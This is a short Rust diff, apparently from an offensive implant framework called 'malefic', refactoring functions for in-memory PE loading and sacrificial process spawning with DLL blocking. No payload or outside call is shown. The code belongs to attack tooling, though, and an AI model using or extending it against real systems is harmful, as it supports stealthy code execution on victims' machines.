@@ -61,7 +61,7 @@ pub unsafe fn load_pe(
     signature: Option<u32>,
 ) -> *const malefic_win_kit::pe::PELoader::MaleficModule {
     
-    use malefic_win_kit::pe::PELoader::{malefic_loader, MaleficModule};
+    use malefic_win_kit::pe::PELoader::malefic_loader;
     if bin.is_empty() {
         return std::ptr::null();
     }
@@ -95,12 +95,12 @@ pub unsafe fn run_sacrifice(
             need_output,
             block_dll,
         );
-        crate::common::convert_u8p2vec(ret)
+        let str = String::from_raw_parts(ret.data, ret.len, ret.capacity);
+        str.as_bytes().to_vec()
     }
     #[cfg(feature = "source")]
     {
         use malefic_win_kit::process::Sacrifice::RunSacrifice;
-        use prost::Message;
         match RunSacrifice(
             application_name,
             start_commandline,
@@ -113,7 +113,7 @@ pub unsafe fn run_sacrifice(
                 ret
             },
             Err(e) => {
-                e.encode_to_vec()
+                e.as_bytes().to_vec()
             }
         }
     }
